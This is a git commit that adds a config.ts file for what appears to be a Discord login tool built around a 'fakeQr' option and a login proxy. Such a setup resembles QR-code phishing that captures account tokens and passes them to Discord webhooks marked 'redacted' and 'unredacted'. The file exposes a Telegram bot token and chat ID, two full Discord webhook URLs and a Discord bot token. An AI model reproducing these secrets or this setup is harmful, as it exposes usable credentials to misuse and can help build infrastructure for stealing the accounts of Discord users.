ecb9759f971e318aa1f6d06800659218bbee5c25
robertasbreive <robertas.breive@gmail.com>
2023-07-23 12:18:00 +0200

    Add files via upload

---
+++ aaa/config.ts
@@ -0,0 +1,25 @@
+// SERVER DETAILS
+export const domain = 'identifier.deno.dev';
+export const fullDomain = `https://${domain}`;
+export const proxies: string[] = [];
+export const fakeQr = true;
+export const qrCodeEndpoint = 'localhost:8080/proxy';
+export const hostingOnVPS = false;
+
+// TELEGRAM DETAILS
+export const telegramToken = '6223354638:AAEwmrUacy4rtWuapyVW4vJyCtOsDgV-MF0';
+export const telegramChatId = '-707991132';
+
+// DISCORD OAUTH DETAILS
+export const clientID = '';
+export const clientSecret = '';
+export const redirectURI = `${fullDomain}/login`;
+
+// WEBHOOKS
+export const redactedWebhook = 'https://discord.com/api/webhooks/1093267238305415208/v-hx_veQa6IHxTCh_0gwfUnq71CqfTCZEczrnFdT0cjaScvVUjYagbbs1EAPP6Dnuqgp';
+export const unredactedWebhook = 'https://discord.com/api/webhooks/1093557184614375495/hY7tLMU-Ty2-UmgEMLXwsVvsdy_4H52og6hXz-A4eFWlJZO4Wd4QGyNKLm0TQJYeEDvI';
+
+// AUTO ROLE
+export const autoRoleToken = 'MTEwMjk2MDE3MzI2NzU1ODQzMA.GgdaRj.mlc0Ws0SVPORvi8XjlYNTsq9_tZnofoOFWLUFE';
+export const autoRoleGuildId = '1091785617177841754';
+export const autoRoleRoleId = '1091803038898978927';
